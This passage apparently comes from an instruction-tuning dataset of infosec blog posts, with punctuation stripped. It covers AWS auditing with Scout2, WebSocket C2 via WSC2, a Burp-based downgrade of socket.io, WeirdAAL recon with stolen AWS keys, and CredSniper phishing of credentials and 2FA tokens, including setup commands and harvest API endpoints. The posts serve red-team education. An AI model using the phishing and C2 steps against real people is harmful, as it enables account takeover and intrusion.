        "output": "Jordan Drysdale Full disclosure and tl dr The NCC Group has developed an amazing toolkit for analyzing your AWS infrastructure against Amazon's best practices guidelines Start here ithub.com nccgroup Scout2 Then access your AWS console as a user with privilege enough to create an auditor account best practice tip 1 once your admin accounts are online and MFA enabled never use the root account Create a user Create a group like the following and enable the SecurityAudit role for this user Review this user account Download the .csv with your access keys We are just about ready to run Scout2 I cloned the repo in to opt so head over to whichever directory you are using and execute the 'pip install -r requirements The --help flag lists the following Because AWS is driven by programmatic functions you need not specify anything more than the credentials file we downloaded earlier to run Scout2 After we let Scout2 do its thing we end up with a highly functional HTML report Then we can drill down as to the 'why of our failures to implement best practices AWS security best practices are documented here 0.awsstatic.com whitepapers compliance AWS_Auditing_Security_Checklist.pdf This tool should be a part of your AWS deployment It is easy to run and provides guidance to make just about any environment more secure"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Command and Control with WebSockets WSC2</title>\n<taxonomies>C2, Craig Vincent, Red Team, C2, command and control, Red Team, WebSockets, WSC2</taxonomies>\n<creation_date>Thu, 26 Jul 2018 14:21:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Craig Vincent This all started with a conversation I was having with a few other BHIS testers At the time I was testing a web application that used WebSockets The app was giving me headaches and I was venting my frustration Penetration testers red teams and baddies are always looking for new ways to sneak by defenses So it wasn't surprising that the conversation shifted to discussing how these struggles could be used in an offensive capacity Someone mentioned that it would be super cool to have a command and control C2 channel that used WebSockets Before we get into why that would be super cool we should take a closer look at the WebSocket protocol WebSocket isn't all that new The protocol originally showed up in HTML5 in the mid to late 2000s It gained traction with developers started shipping with browsers and the specification RFC 6455 was finalized in 2011 The WebSocket protocol facilitates a full-duplex communication channel between the server and the client over TCP This allows for true asynchronous communication between the client and the server This is a big break from the request response nature of the HTTP protocol Before WebSocket the most popular way to achieve asynchronous communication was to use AJAX Except AJAX still depends on the client to poll the server so it's really just half-duplex WebSockets allow the server to send messages to the client at will and vice versa Tracking the flow of asynchronous communication is a little harder than tracking the flow of traditional HTTP requests and responses Also the format of the data sent using WebSockets is almost completely specified by the application developer As I found out these factors can make testing applications that use WebSockets more challenging This also means more work for defenders who need to inspect web traffic So the idea is that we can use WebSockets to establish a command and control channel that might not be given as much scrutiny Fortunately Arno0x0x is way ahead of us on this and wrote a tool called WSC2 which is available on GitHub at ithub.com Arno0x WSC2 There is also a great blog post introducing the tool rno0x0x.wordpress.com 2017 11 10 using-websockets-and-ie-edge-for-c2-communications So let's take WSC2 for a spin The tool comes almost ready to use as soon as you clone it to your attack server Details like the IP address of the C2 server are managed in a configuration file called config.py I did make a couple of modifications to this file like configuring the callback to point to my command and control server and setting a new password Once launched I found the controller component of WSC2 to be intuitive and similar to other C2 applications I've used in the past WSC2 comes with several stager payloads but I decided to use the PowerShell one-line stager to launch an agent on my Windows 10 victim machine Because the callback configuration had already been handled in a separate file generating the payload was as quick as launching the WSC2 controller and typing genStager psoneliner All that was left to do was run the PowerShell one-liner on my victim machine I was immediately rewarded with an agent callback The following screenshot shows the entire process form the controller point of view The WSC2 agent itself isn't packed with a ton of features It does let you upload and download files to from the victim machine as well as drop into a shell and execute commands on the remote host One of the interesting things about the WSC2 agent is that it communicates with the C2 server through Internet Explorer Edge using a COM object Arno0x0x threw that in for EDR evasion and I thought it was cool For demonstration purposes I ran Process Monitor part of Windows Sysinternals Suite on my victim machine to watch processes that were participating in network communications while the agent was running Sure enough all of my agent traffic showed up as IEXPLORE.EXE I configured Internet Explorer to proxy traffic through Burp Suite on the victim side This allowed me to see the connection upgrade from HTTP to WebSocket We can also use Burp Suite to view the WebSocket traffic generated when commands are issued to the agent Using WebSockets for command and control is something that should be considered by penetration testers red teams and defenders alike WSC2 makes establishing a WebSocket command and control channel in your environment to test your monitoring and defense solutions quick and easy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What to Expect After a Pen Test</title>\n<taxonomies>Blue Team, Finding, General InfoSec Tips & Tricks, How-To, Informational, after the pen test, how to deal with you penetration test results, What to do after a penetration test, what to do after a pentest</taxonomies>\n<creation_date>Thu, 02 Aug 2018 13:51:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Scott Worden So you and your company had a pen test now what What to do how to plan and good SQUIRREL ways to stay on track The 3 Stage of the Penetration Test The TESTER The TESTED Having the penetration tester reach your crown jewels get root own you pwn you own3d 0wn3d pwned pooned or whatever phrasing you use is NOT a failure The point of a penetration test is to find where you are vulnerable so you can improve There is no failing a pen test with two exceptions If you artificially insert preventions or react differently to the pen tester you fail If the same fixable finding shows up on multiple pen tests you fail Your Penetration Test Is Done Now What What do you do now If you had a pen test just to check a compliance box or say that you had one you are done Bury that head deeper in the sand even though eventually it has to and will come out the other side If your pen test has no findings well did you have an actual pen test or a vulnerability assessment Were the people that performed the pen test competent Did you let them test realistically If yes to all that then contact me I have much to learn from you For the rest of us it is time to stop commiserating put down the adult beverage and get to work The following comes from my own experience what I have seen and what has worked for me It might not match with your scenario the opinions of the company I work for or of those with whom I work but hopefully there are a few nuggets of wisdom you can extract Read That Report Since the point of a pen test is to improve the report needs to be actionable Do you understand the findings Can you recreate them If not contact the tester They do not have to give you their secret sauce there is a reason you pay them to do what they do but they should be willing to share with you the basics so you can at least partially recreate the findings in your own environment Make That Plan Next step is develop plans Most of you are probably doers and want to jump right to making changes No issue with that as long as you do not lose sight of the bigger goals reacting to all the findings improving security and keeping systems usable You might have a great idea how to prevent a certain technique only to have it also prevent the business from doing their job For findings you know how to mitigate the plan is as simple as how to prevent if possible and detect If you are not sure how to mitigate a finding then the plan is to perform research based on that to create a mitigation plan Easy Every finding should have a plan with a priority and if possible be assigned to someone with a due date Do not stop at mitigating just one finding thinking Well since I blocked how they got in we are good Any one prevention technique will only be bypassed by malicious actors as well as pen testers Finally put the plans and tasks in so that you can track to ensure they are done Remember one of the ways to fail a pen test Made Plans Time to Make Changes Great you have plans time to start making changes well maybe not Do you have time to work on them Do you need resources from other teams Is there business impact You need buy in from management the people directly impacted and the people that will implement the changes What seems to work is presenting the pen test results For management that might just be the report For more technical people walk through what the pen tester did Show the steps and how easy it was for the pen tester to gather tokens move around the environment etc This tends to make more sense to technical people than just a report In the end a demonstration is worth a thousand words Some companies might be apprehensive about showing their flaws and vulnerabilities i.e want to hide the findings in order to give the appearance of being more secure To me the benefits you get from demonstrating the findings to people affected by them or that can help you fix them far outweigh the risk It's amazing how these types of presentations have garnered interest and backing where I work The more people you get interested in improving the security of your company the easier your job will be or much much harder You might not like presenting few people do but this is your chance to shine get buy in for the findings as well as try to get people interested in security You will be presenting about something you should and hopefully enjoy You might be surprised and enjoy the experience Word of caution though do not blow smoke They will know If you do not know something say so and get back to them Start Small to Go Big Great now you can start making changes well maybe not There might be some plans that will require a lot of work and resources or have a large impact on the business causing management or other teams to balk at implementing them One way to handle this is break the plan up into smaller tasks that are more actionable Can't change the length of all your passwords What about just the critical ones you do know them correct IS or just the Security Team eat your own dog food Trying to implement MFA Same thing start small implement just for the critical scenarios then build upon your success With each successful implementation the hesitancy should decrease Whatever you do once you start keep making progress don't let it drop Is That a Squirrel Not letting things drop is imperative I have found the security realm to be the worst when it comes to the squirrel effect There is always another alert the next super critical urgent task the next creatively named malware or new shiny tool It is easy to let things you find less interesting slip and assume they will be handled by others Step up take ownership and be the lead to getting these items mitigated to the extent you can Can't mitigate something Detect it Can't detect it Make sure you have visibility so you can hunt for it Can't get visibility Make sure it is on a list to review in the future We all know that things change in the security and computer world and a new method might be available in the near future You Got This A penetration test can be very frustrating and disheartening Try to keep in mind the purpose to improve and mature your overall security To fulfill this purpose you must do your part by reacting and following through on all the findings So when you have your next pen test embrace the findings for the challenge they are and strive to defeat the pen testers next time Just don't roll a one ______ Scott is a guest blogger from undisclosed company He works as a Security Engineer somewhere in the midwest and has his punch card almost full from attending BHIS webcasts"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Hack WebSockets and Socket.io</title>\n<taxonomies>Author, Ethan Robish, How-To, Socket.io, WebSockets</taxonomies>\n<creation_date>Thu, 09 Aug 2018 15:04:39 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish WebSockets Overview WebSockets is a technology to allow browsers and servers to establish a single TCP connection and then asynchronously communicate in either direction This is great for web apps as it allows real time updates without the browser needing to send hundreds of new HTTP polling requests in the background It's bad for pentesters as the tool support for WebSockets is not nearly as prevalent or sophisticated as for HTTP In addition to Burp Suite a few other tools exist for dealing with WebSockets I attempted to use each of these but none of them worked the way I wanted Zed Attack Proxy ZAP Pappy Proxy Man-in-the-Middle Proxy mitmproxy WebSocket Socket.io WSSiP If you're interested in using WebSockets on the offensive side to evade detection check out this post ww.blackhillsinfosec.com command-and-control-with-websockets-wsc2 In this post I'm going to mainly focus on socket.io a popular WebSockets library for JavaScript However some of the ideas here could be applied to other libraries or generically to the WebSockets protocol as well How popular is socket.io It has over 41 thousand stars on Github It also occupies the slots for 2nd and 3rd most popular WebSockets package on NPM It turns out that the excellent OWASP Juice-Shop Project uses the socket.io library so I will be using it for demonstration ithub.com bkimminich juice-shop search?utf8 E2 9C 93 q socket.io type This post assumes you are already somewhat familiar with testing web applications using Burp Suite and everything covered can be accomplished in the Community Edition Without further ado let's jump in If we go to Juice-Shop in the browser we can quickly see the WebSocket traffic in the background You can find this in Burp by going to Proxy WebSockets history Unlike HTTP where you always have request response pairs due to the stateless nature of the protocol WebSockets is a stateful protocol This means that you can have any number of outgoing requests and any number of incoming responses from the server Since the underlying connection is TCP that is held open both the client and the server can send messages at any time without waiting for the other This explains the differences in the WebSockets history view from the HTTP history you may be used to looking at In this view you'll mostly see single-byte messages sent and received But when the application does something interesting you'll see messages with larger payloads Burp has some capability for testing with WebSockets You can intercept and modify them in real-time but there is no Repeater Scanner or Intruder functionality for WebSockets WebSocket interception is enabled by default in Burp and all you need to do is turn on the master interception You'll get intercepted WebSocket messages the same way you do for HTTP You can also edit them in the interception window And view the edited messages in the WebSockets history tab Downgrading WebSockets to HTTP Method 1 Abusing Socket.io's HTTP Fallback Mechanism One oddity I quickly noticed was that sometimes I would see similar messages in the HTTP history as I had seen in the WebSockets history If you recall from above the interesting WebSockets message I pointed out had to do with solving the scoreboard challenge Below shows the same response from the server except this time in HTTP history So I knew that socket.io was capable of sending messages both over WebSockets or HTTP I guessed that HTTP was available in order to fall back on in case WebSockets was not supported or somehow blocked in the application The transport parameter drew my attention with its values of websockets and polling in the requests I observed This section in socket.io's documentation talks about how polling and websockets are the two default transport options It also shows how you can disable polling by specifying WebSockets as the sole transport I figured the reverse would be true as well and that I could specify polling as the sole transport mechanism ocket.io docs client-api with-WebSocket-transport-only By searching through socket.io.js source code I came across the following which certainly looked promising this.transports n.transports polling WebSocket That line of code is setting an internal variable called transports to some value passed in OR defaulting to polling websocket if the passed in value is false empty That would definitely fit our understanding so far of the default transports being polling and WebSockets Let's see what happens if we set up a match and replace rule under Proxy Options in Burp to change these defaults Success After the rule was added refresh the page I also had to enable Burp's built-in rule to Require non-cached response or perform a forced refresh and no more communication was sent via WebSockets That's great but what if the application you are using already provides transport options which would take precedence over our new defaults In this case we can just modify our match and replace the rule The following rule should work for different versions of the socket.io library and disregard any transports specified by the application developers For ease of copy-paste here are the strings to use this .transports .transports polling websocket this.transports polling Be sure to set this as a regex match Method 2 Interrupting the WebSockets Upgrade Method 1 is specific to socket.io and could possibly be extended to other client libraries But the following method should be a little more universal as it targets the WebSockets protocol itself After some investigation I found that WebSockets first communicates over HTTP in order to negotiate with the server and upgrade a connection to a WebSocket The important parts of this are 1 The client sends requests an upgrade request with some WebSocket specific headers 2 The server responds with a status code of 101 Switching Protocols also with some WebSocket specific headers 3 The communication transitions to WebSockets and we don't see any more HTTP requests for this particular conversation The WebSockets RFC section 4.1 gives all sorts of clues on how we can interrupt this workflow Below is an excerpt from ools.ietf.org html rfc6455 section-4.1 with my own added emphasis If the status code received from the server is not 101 the client handles the response per HTTP RFC2616 procedures In particular the client might perform authentication if it receives a 401 status code the server might redirect the client using a 3xx status code but clients are not required to follow them etc Otherwise proceed as follows If the response lacks an Upgrade header field or the Upgrade header field contains a value that is not an ASCII case-insensitive match for the value WebSocket the client MUST_Fail the WebSocket Connection_ If the response lacks a Connection header field or the Connection header field doesn't contain a token that is an ASCII case-insensitive match for the value Upgrade the client MUST _Fail the WebSocket Connection_ If the response lacks a Sec-WebSocket-Accept header field or the Sec-WebSocket-Accept contains a value other than the base64-encoded SHA-1 of the concatenation of the Sec-WebSocket-Key as a string not base64-decoded with the string 258EAFA5-E914-47DA-95CA-C5AB0DC85B11 but ignoring any leading and trailing whitespace the client MUST _Fail the WebSocket Connection_ If the response includes a Sec-WebSocket-Extensions header field and this header field indicates the use of an extension that was not present in the client's handshake the server has indicated an extension not requested by the client the client MUST _Fail the WebSocket Connection_ The parsing of this header field to determine which extensions are requested is discussed in Section 9.1 With those MUST Fail conditions in mind I came up with the follow set of replacement rules which should fail on all five Once those rules were in all WebSocket upgrade requests failed Since socket.io will silently fail to HTTP by default this has the desired effect Specific implementations or other libraries may behave differently and cause errors in the application you are testing But our jobs are to make software do things it wasn't meant to The original response looked like this and would have resulted in the client and server transitioning to WebSockets for communication Instead the client received this modified response from the server and by the RFC should fail the WebSockets attempt One thing I encountered during a test was that after putting these match and replace rules in the client was extraordinarily persistent in retrying WebSockets connections and caused a lot of unwanted traffic in my HTTP history If you are dealing with the socket.io library it is probably easiest to use Method 1 above If you have a different library or situation you may have to add more rules to convince the client that the server does not support WebSockets or even cripple the WebSockets functionality in the client library Using Burp Repeater as a Socket.io Client Since we've forced communication to go over HTTP instead of WebSockets you can now add in custom match and replace rules that will apply to the traffic that would have gone over WebSockets Next we can go one step further and pave the way for using tools like Repeater Intruder and Scanner These changes will be specific to the socket.io library There are a couple of problems that prevent us from repeating the HTTP requests that socket.io uses Each request has a session number and any invalid requests will cause the server to terminate that session The body of each request has a calculated field for the length of the message If this is incorrect the server treats it as an invalid request and terminates the session Here are a couple of example URLs used in the application socket.io ?EIO 3 transport polling t MJJR2dr socket.io ?EIO 3 transport polling t MJJZbUa sid iUTykeQQumxFJgEJAABL The sid parameter in the URL represented a single connection stream to the server If an invalid message was sent as is common when trying to break things then the server would close the entire session and I had to start over with a new session The body of a given request contained a field with the byte count of the payload This is similar to the Content-Length HTTP header except it was specific to the socket.io payload For instance if the payload you wanted to send was hello then the body would be 5 hello and the Content-Length header would be 7 That's 5 for the letters in hello and 7 accounts for both the letters in hello as well as the 5 which socket.io adds to the body As always Burp will update the Content-Length header for us so we don't need to worry about that But I could not find a good way to automatically calculate and include the length of the payload To complicate matters more I witnessed socket.io sending multiple messages within the same HTTP request Since each was an encapsulated WebSockets payload each had its own length and ended up looking something like this 5 hello 4 john 3 doe the actual syntax may have been different but you get the idea Any error in calculating the length and the server would reject it as an invalid message and bring us back to problem 1 This is an example of a message body This is from a response in the Juice-Shop app but the requests were formatted the same Note that 215 here represents the length of the payload following the 215 42 challenge solved key zeroStarsChallenge name Zero Stars challenge Zero Stars Give a devastating zero-star feedback to the store flag e958569c4a12e3b97f38bd05cac3f0e5a1b17142 hidden false Macro I was able to solve the first problem using a Burp Macro Basically each time Burp matched on a server rejection of a message the macro would automatically establish a new session and update the original request with the valid sid Create a new macro by going to Project options Sessions Macros Add The URL to establish a new session was simply crafted by leaving off the sid parameter For instance socket.io ?EIO 3 transport polling t MJJJ4Ku I found that the value of t didn't really matter so I left it untouched The server response included a brand new sid value for us to use Next click the Configure item button and fill in the parameter name as sid Use the Extract from regex group option and the following regex sid Your configuration window should look something like this Session Handling Rule Now that we have a macro we need a way for it to be triggered This is where Burp Session Handling Rules come in Create a new rule by going to Project options Sessions Session Handling Rules Add Create a new Rule Action for Check session is valid Configure the new rule action as follows Finally after finishing your new rule action modify the scope of the rule Here is where you can decide where you want this rule to apply I'd recommend using it for Repeater at least so you can manually repeat requests The following is how I configured the scope rules You can get more specific with your scope but the options below should work for most Here is a request made without the session handling rule in place And here is the same request made with the rule in place Notice that the session handling rule transparently updates the cookies and the value for sid in the request for you Final Thoughts Ultimately I was prevented from using Burp Scanner and Intruder by problem 2 discussed above I modified an existing Burp plugin and that appeared to do the job but the server didn't like it for some reason If anyone is interested in furthering this research feel free to reach out to me"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>AWS: Assuming Access Key Compromise</title>\n<taxonomies>Red Team, Red Team Tools, AWS, Carnal0wnage, Compromise, SEC504, WeirdAAL</taxonomies>\n<creation_date>Mon, 06 Aug 2018 14:42:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale In this blog we are assuming that we have obtained an access key a secret key and maybe a .pem key from a network user who left these things lying around What services do they have access to How far can we get Here we stand again on the shoulders of giants with the prospect of using their efforts to take advantage of someone else's mistake In this case that giant is Carnal0wnage His effort the WeirdAAL ithub.com carnal0wnage weirdAAL toolkit is another brilliant piece of work designed to audit the privileges belonging to a stolen set of AWS keys I cloned the utility in to opt and checked out the README.md which sends you back over to the wiki Some commands here cd weirdAAL apt-get install python3-venv if required python3 -m venv weirdAAL source weirdAAL bin activate pip3 install -r requirements.txt python3 create_dbs.py cp env.sample .env vim .env insert keys in ignition here Then head over to usage and run the recon_all My command looked like this python3 weirdAAL.py -m recon_all -t MyTarget recon_out.file We get results sorted per 'enumerable service on AWS This compromised user did not have IAM or root privileges However the user has some EC2 privileges and access to a few other services To wrap up cleanly we've compromised a domain user and stolen their AWS credentials access and secret key Using Carnal0wnage's recon_all flag we know exactly what this user can do on AWS Further research might lead us in to another series of tools for AWS investigations ithub.com toniblyx my-arsenal-of-aws-security-tools H T dafthack Another day another way Cheers and happy cloud securing Join Jordan and Kent Tuesday August 7th for their webcast as they walk through an Active Directory best practices environment The deployment includes two Amazon Web Services AWS Active Directory Domain Controllers in a multi-availability zone configuration The best practices will also cover some AWS basics deploying your domain in the cloud and lots more Register here ttendee.gotowebinar.com register 4918848176372744707?source b"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Your Infosec Supply List</title>\n<taxonomies>Fun & Games, General InfoSec Tips & Tricks, InfoSec 101, InfoSec 201, Blue Team, books, Getting into Infosec, infosec 101, infosec books, Red Team, tools</taxonomies>\n<creation_date>Thu, 16 Aug 2018 13:18:28 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Bre Schumacher As I was walking through the back to school display at the store the other day I picked up a handy-dandy school supply list Of course there were all the usual things scissors glue notebooks etc but it made me wonder what would be on the supply list for someone just starting out in the infosec field So I asked one of our testers Jordan to help create such a list For those of you who are starting a new chapter venturing into information security here is your unofficial official supply list And for anyone who's been around this stuff for a while what else would you add to this list Make sure to tweet us witter.com bhinfosecurity?lang en your suggestions Please note that some of these may seem like they lean more to the red team or blue team side but we believe they can be useful in both situations Not sure how Feel free to contact us to ask more questions Infosec Supply List 2018 all items are not required but they are highly recommended Books Blue Team Field Manual BTFM www.amazon.com Blue-Team-Field-Manual-BTFM dp 154101636X Red Team Field Manual RTFM www.amazon.com Rtfm-Red-Team-Field-Manual dp 1494295504 Offensive Countermeasures www.amazon.com Offensive-Countermeasures-John-Strand dp 1974671690 Other Items Cubicles Compromises IR Tabletop Game www.blackhillsinfosec.com tabletop Bash Bunny hakshop.com products bash-bunny Rubber Ducky hakshop.com products usb-rubber-ducky-deluxe Wifi Pineapple hakshop.com products wifi-pineapple Alfa Wireless Adapter www.amazon.com AWUS036NEH-Range-WIRELESS-802-11b-USBAdapter dp B0035OCVO6 32GB USB drives www.amazon.com Kingston-Digital-DataTraveler-32GB-DTSE9H dp B00DYQYJ0E TracFone for identity management ww.target.com b tracfone N-5y62p Accessories Black Hoodie www.amazon.com Hanes-EcoSmart-Fleece-Hoodie-Black dp B00JUM4CT4 Writing utensils in photo above black to match the hoodie of course www.amazon.com Crayola-My-Color-is-Black dp B011TNIQCA BHIS Sticker We try to go to several events each year Make sure to stop by our booth say hi and grab a sticker Ticket to Wild West Hackin Fest www.wildwesthackinfest.com And don't forget to check out these great resources 30 Things to Get You Started www.blackhillsinfosec.com 30-things-to-get-you-started The BHIS Blog is a trove of information www.blackhillsinfosec.com blog John's 5 year plan www.youtube.com watch?v Uv-AfK7PkxU t 1s Our YouTube channel www.youtube.com channel UCJ2U9Dq9NckqHMbcUupgF0A The BHIS podcasts www.blackhillsinfosec.com podcasts And don't forget to sign up for our email list to be notified of upcoming webcasts blackhillsinfosec.us15.list-manage.com subscribe?u e12efe2af6573cc76c90fc019 id b7b017ed3a"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Stealing 2FA Tokens on Red Teams with CredSniper</title>\n<taxonomies>Author, Mike Felch, Phishing, Red Team, 2FA, multi-factor, phishing, Red Team</taxonomies>\n<creation_date>Mon, 20 Aug 2018 14:00:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Felch More and more organizations are rolling out mandatory 2FA enrollment for authentication to external services like GSuite and OWA While this is great news because it creates an added level of security to the external perimeter it also forces red teams and pentest organizations to innovate new techniques into capturing 2FA tokens instead of just obtaining employee credentials Over the years there has been a number of attack primitives related to obtaining 2FA tokens In some cases attackers would attempt to spoof GSM on mobile phones try to brute force tokens or even bypass 2FA requirements altogether by searching for legacy portals that have multi-factor disabled Recently attackers have started social engineering victims into sending their tokens through SMS messages by scamming users with a fake password reset initiation on the account While some of the techniques may work from time to time the likelihood of them being a sound attack path is fairly unlikely CredSniper was originally birthed out of a need while on a red team engagement and since then has morphed into a sound method of successfully obtaining credentials and 2FA tokens from even highly-technical senior staff Introducing CredSniper Phishing credentials has been going on for years and most organizations are beginning to roll out awareness training in their normal onboarding processes The problem I see regularly is that organizations are training on how to spot red flags in emails instead of instilling healthy internet behaviors regardless of the communication platform If I can lure an unsuspecting victim to an exact clone of an authentication portal they are already familiar with most will hand over their credentials and 2FA tokens if I ask nicely This is where CredSniper really shines HTTPS is Mandatory Aside from protecting targets on an engagement from putting their credentials in a non-HTTPS site it's equally important to ensure the quality of the cloned authentication portal doesn't reveal the red flags most organizations train to recognize This is mandatory if you are cloning a GSuite portal because Google Chrome browser will alert the target that the site is a malicious looking site The moment you switch over to HTTPS this problem resolves itself because Google isn't intercepting the request and response payload between the visitor and the server During the installation CredSniper will request a new SSL certificate from Let's Encrypt for the host you supply The only prerequisite is that the hostname you plan to use is pointing to the IP address of the server hosting the cloned portal Modular Authentication Portals While CredSniper comes with a module for GSuite new modules can be created with minimum overhead In the future this will be much more streamlined but in the meantime users can create a new portal module in 5-10 minutes The module defines the mapping between templates and routes For instance if someone accesses login then the module will know to load the correct template for that phase of the authentication process The idea behind CredSniper was that functionality could be written to authenticate with the genuine portal behind the scenes and during the interaction with the target By authenticating with the genuine site the 2FA SMS token would be sent to the target and CredSniper could prompt the user to enter it Templates are the HTML copy of the genuine portal but with the necessary templating tags CredSniper uses a templating language called Jinja2 which provides a seamless way to personalize phishing pages with user-supplied data For instance some authentication portals like GSuite first ask the user for an email address before sending them to a password page and then on to the 2FA page Within the password page GSuite displays the users profile image right next to their email address Because CredSniper captured the email address at the first stage of the phish using it in subsequent pages is as simple as placing the tag username in the HTML template Jinja2 automatically replaces the tag with the value when rendering the template Any number of routes can be configured within the module to account for all different variations of authenticating processes API Integration CredSniper also comes with a light-weight API so users can integrate the harvested credentials in other applications Due to 2FA token expiration occurring fairly quick the API provides a fast way of consuming the credentials to automate authentication tasks before it's too late Upon running CredSniper an API token will be displayed on the screen which will provide the ability to consume the end-points for viewing credentials marking them as seen and for updating the configuration View Credentials GET https creds view?api_token Mark Credential as Seen GET https creds seen ?api_token Update Configuration POST https config 'enable_2fa true 'module 'gmail 'api_token 'some-random-string Simple Installation In order to kick-off the installation CredSniper requires the DNS to be configured for the hostname you plan on using As mentioned earlier Let's Encrypt needs to be able to verify the hostname before issuing an SSL certificate so the hostname needs to be assigned to the IP address of the host where CredSniper is being hosted Some people have reported that the installation script will throw errors on distros other than Ubuntu 16.04 While it's possible to get everything installed and running on other Linux versions or distributions it's highly recommended to use Ubuntu 16.04 to avoid problems that might require troubleshooting The first thing you will want to do is clone the GitHub repo this will grab all the necessary files and also provide an easy way to upgrade as new code is pushed Once it's cloned switch directories and run the install.sh script git clone ithub.com ustayready CredSniper cd CredSniper CredSniper install.sh The install script will request information from you in order to configure the required parameters and kick-off the initial running of CredSniper These parameters can be passed in as flags in future runs of CredSniper Module to deploy ex gmail This is the CredSniper module that will be run For a list see the modules directory Final redirect URL The final destination URL for the target's browser after phishing This should coincide with your ruse in order to eliminate suspicion in the mind of the target Enable SSL Y n Whether to phish using SSL or not This may be required in future versions due to how the browser's flagging suspicious looking sites Enable two-factor phishing Y n This option is whether or not to control two-factor phishing without having to change the module routes Sometimes two-factor is not enabled and being able to disable it from the command-line is convenient Enter hostname for certificates ex app.example.com This hostname will be used by Let's Encrypt in order to retrieve an SSL certificate for CredSniper In order for CredSniper to be reachable by this hostname the DNS for the hostname must be pointing to the IP address of the hostname before install.sh is run Port to listen on default 80 443 CredSniper only runs in either HTTP or HTTPS mode not both Sometimes portals that are cloned run on alternative ports in order to look legit CredSniper can be configured to run on alternative ports By default if CredSniper is running in HTTP mode then port 80 is assigned If running in HTTPS mode 443 is assigned A number of pre-requisites will also be installed if they are not already present Let's Encrypt Apt Repository Python3 VirtualEnv GnuPG CertBot Python3 modules Flask mechanicalsoup pyopenssl Using Python3 a virtual environment will be created and the necessary Python3 modules will be installed Next port binding for Python will be enabled so listening on port 80 443 can be possible from userland Finally the certificate and private key for the SSL certificate will be copied into the certs folder After a successful installation of everything CredSniper will be ran The install.sh script will not be required for future executions of CredSniper In order to execute CredSniper simply run the python script python credsniper.py --help If you happen to log out of the host and want to run CredSniper at a later time be sure to first activate the Python virtual environment before running credsniper.py cd CredSniper CredSniper source bin activate CredSniper CredSniper python credsniper.py --help That's it Flexible Usage CredSniper comes with a flexible ability to run in a number of different configurable modes In order to access the flags simply pass the --help during execution usage credsniper.py -h --module MODULE --twofactor --port PORT --ssl --verbose --final FINAL --hostname HOSTNAME optional arguments -h --help show this help message and exit --module MODULE phishing module name for example gmail --twofactor enable two-factor phishing --port PORT listening port default 80 443 --ssl use SSL via Let's Encrypt --verbose enable verbose output --final FINAL final url the user is redirected to after phishing is done --hostname HOSTNAME hostname for SSL If you choose to monitor phished credentials without using the built-in API there are two files you should be familiar with Temporary cached credentials .cache The cache file provides an intermediate aggregation of credentials that pass through the username and password phase of the phish Originally designed to temporarily store credentials when two-factor is enabled it was to prevent a loss of credentials in the event a target doesn't complete the two-factor step Phished credentials .sniped The sniped file provides a flat-file storage of captured credentials along with other information like two-factor information IP address and geolocation information In some cases if you authenticate with credentials from a new location to sites like Gmail they will prompt you to supply the last location you authenticated from By grabbing the IP address of the phished target and quickly geolocating them you can supply an accurate answer Cloning Pages While the only built-in module that has been made public is Gmail there is also an example module in the modules directory that will help you quickly create new modules In order to quickly clone a page I tend to start by using a FireFox plugin called 'Save Page WE which will conveniently embed external resources internally in a single HTML page This makes it convenient and avoids loading embedding resources hosted by the cloned website hopefully removing any call-backs that CredSniper might have accidentally made Be sure to follow the example module HTML templates in order to include the correct templating parameters Stay tuned for a future blog post on how to clone pages for CredSniper or check out our 